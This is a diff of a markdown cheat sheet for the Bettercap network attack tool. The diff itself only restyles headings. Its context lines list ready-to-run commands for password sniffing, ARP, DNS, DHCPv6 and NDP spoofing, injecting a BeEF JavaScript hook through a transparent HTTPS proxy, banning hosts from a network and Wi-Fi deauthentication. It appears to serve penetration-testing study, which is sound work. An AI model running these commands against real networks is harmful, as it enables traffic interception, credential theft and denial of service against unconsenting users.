@@ -1,25 +1,25 @@
 # ⭕ Bettercap
 
-## Official Documentation
+## <mark style="color:red;">Official Documentation</mark>
 
 {% embed url="https://www.bettercap.org/modules" %}
 
-## Get Module Help
+## <mark style="color:red;">Get Module Help</mark>
 
 ```
 >> help [module name]
 >> help net.recon
 ```
 
-## Recon & Monitoring
+## <mark style="color:red;">Recon & Monitoring</mark>
 
-#### show list of host details
+#### <mark style="color:green;">show list of host details</mark>
 
 ```
 net.show
 ```
 
-#### turn passive host discovery on/off
+#### <mark style="color:green;">turn passive host discovery on/off</mark>
 
 ```
 net.recon on/off
@@ -27,7 +27,7 @@ net.recon on/off
 
 The net.recon module performs passive scanning and is on by default, but it may not discover active devices that are not sending ARP messages while Bettercap is running. Bettercap also includes an active scanning feature in the net.probe module. Bettercap's net.probe module will continually send UDP packets to all hosts on the network. Bettercap sends the UDP activity in the form of four common protocols: NetBIOS Name Service (NBNS) discovery, Multicast DNS (MDNS), Universal Plug-and-Play (UPNP), and Web Services Discovery (WSD).
 
-#### turn active host discovery on/off
+#### <mark style="color:green;">turn active host discovery on/off</mark>
 
 ```
 net.probe on/off
@@ -35,7 +35,7 @@ net.probe on/off
 
 Running the net.probe module for several seconds will typically reveal many more host discoveries than the net.recon module will discover. During the active discovery, or after stopping the discovery, you can examine information about discovered hosts using the net.show command.
 
-## Sniffing
+## <mark style="color:red;">Sniffing</mark>
 
 #### turn packet sniffing on/off
 
@@ -86,7 +86,7 @@ set net.sniff.filter not arp
 set net.sniff.filter dhcp
 ```
 
-### Password Sniffing
+### <mark style="color:orange;">Password Sniffing</mark>
 
 ```
 set net.sniff.local true
@@ -127,7 +127,7 @@ https.proxy on
 arp.spoof on
 ```
 
-## Proxy JS Injection (XSS)
+## <mark style="color:red;">Proxy JS Injection (XSS)</mark>
 
 we use beef-xss active caplet
 
@@ -158,11 +158,11 @@ bettercap -caplet beef-active.cap -eval "set arp.spoof.targets 192.168.1.6; arp.
 
 When user opens HTTP website, for instance time.com, hook will be executed
 
-## Bettercap + BeFF Hook
+## <mark style="color:red;">Bettercap + BeFF Hook</mark>
 
 {% embed url="https://www.youtube.com/watch?ab_channel=CodeOnCommand&v=CHbIV9eU2mg" %}
 
-## Fuzzing
+## <mark style="color:red;">Fuzzing</mark>
 
 In addition to packet-sniffing capabilities, Bettercap also can mutate packets for network protocol fuzzing using the net.fuzz module. By default, the net.fuzz module will mutate 100% of packets transmitted by Bettercap, mutating 40% of the packet payload data. You can adjust these values by changing the net.fuzz.rate and net.fuzz.ratio parameters.
 
@@ -187,7 +187,7 @@ net.fuzz.rate
 net.fuzz.ratio
 ```
 
-## SYN Scan
+## <mark style="color:red;">SYN Scan</mark>
 
 #### start scan
 
@@ -214,7 +214,7 @@ syn.scan.progress
 //net.show
 ```
 
-## Ticker Commands
+## <mark style="color:red;">Ticker Commands</mark>
 
 The Bettercap ticker allows you to specify a collection of commands to run at a fixed frequency, which is great for monitoring the network or periodically scanning for new network targets.
 
@@ -227,7 +227,7 @@ set ticker.period 10
 set ticker.commands "clear; net.show; events.show 20 "
 ```
 
-## ARP Spoof
+## <mark style="color:red;">ARP Spoof</mark>
 
 start ARP spoof
 
@@ -261,14 +261,14 @@ set arp.spoof.targets 192.168.1.6; arp.ban on
 set arp.spoof.targets 192.168.1.2-4; arp.spoof on
 ```
 
-## Ban Target From Network
+## <mark style="color:red;">Ban Target From Network</mark>
 
 ```
 set arp.spoof.targets <TARGET_IP>
 arp.ban on
 ```
 
-## DNS Spoof
+## <mark style="color:red;">DNS Spoof</mark>
 
 Set the dns.spoof.address for the host that you want to receive client activity stemming from spoofed responses. Set dns.spoof.domains to a comma-separated list of all the domains you want to target for DNS spoofing, or set dns.spoof.all to true to spoof all DNS responses. Alternatively, you can target your attack by setting dns.spoof.hosts to a hosts file that uses a specific hostname-to-IP-address pairing (using the same configuration of the standard /etc/hosts file on UNIX systems).
 
@@ -300,19 +300,19 @@ set dns.spoof.all true/false
 set dns.spoof.hosts [hostsfile]
 ```
 
-## DHCPv6 Spoof
+## <mark style="color:red;">DHCPv6 Spoof</mark>
 
 ```
 dhcp6.spoof on/off
 ```
 
-## NDP Spoof
+## <mark style="color:red;">NDP Spoof</mark>
 
 ```
 ndp.spoof on/off
 ```
 
-## Custom Proxy
+## <mark style="color:red;">Custom Proxy</mark>
 
 turn any proxy on/off
 
@@ -338,13 +338,13 @@ set any.proxy.dst_address [ip]
 set any.proxy.dst_port	[port]
 ```
 
-## TCP Proxy
+## <mark style="color:red;">TCP Proxy</mark>
 
 ```
 tcp.proxy on/off
 ```
 
-## HTTP Proxy
+## <mark style="color:red;">HTTP Proxy</mark>
 
 ```
 http.proxy on/off
@@ -375,7 +375,7 @@ http.proxy on
 arp.spoof on
 ```
 
-## HTTPS Proxy
+## <mark style="color:red;">HTTPS Proxy</mark>
 
 A full featured HTTPS transparent proxy that can be scripted using javascript modules. If used together with a spoofer, all HTTPS traffic will be redirected to it and it will automatically handle port redirections as needed.
 
@@ -400,7 +400,7 @@ https.proxy.injectjs
 set https.proxy.script /root/Desktop/Hook.js
 ```
 
-## Wifi Network Monitoring
+## <mark style="color:red;">Wifi Network Monitoring</mark>
 
 wifi.recon covers both 2.4 Ghz and 5Ghz frequencies. It’s doing everything you need. Deauth, Sniff, Handshake captures. To start, add -iface option:
 
@@ -469,7 +469,7 @@ wifi.deauth CLIENT-BSSID
 
 When you capture the handshake, you can start breaking them. We’ll not cover that here.
 
-## BLE (Bluetooth Low Energy device discovery)
+## <mark style="color:red;">BLE (Bluetooth Low Energy device discovery)</mark>
 
 The `ble.recon` will discovery every BLE device you want to inspect with `ble.enum` or playaround with `ble.write`.
 
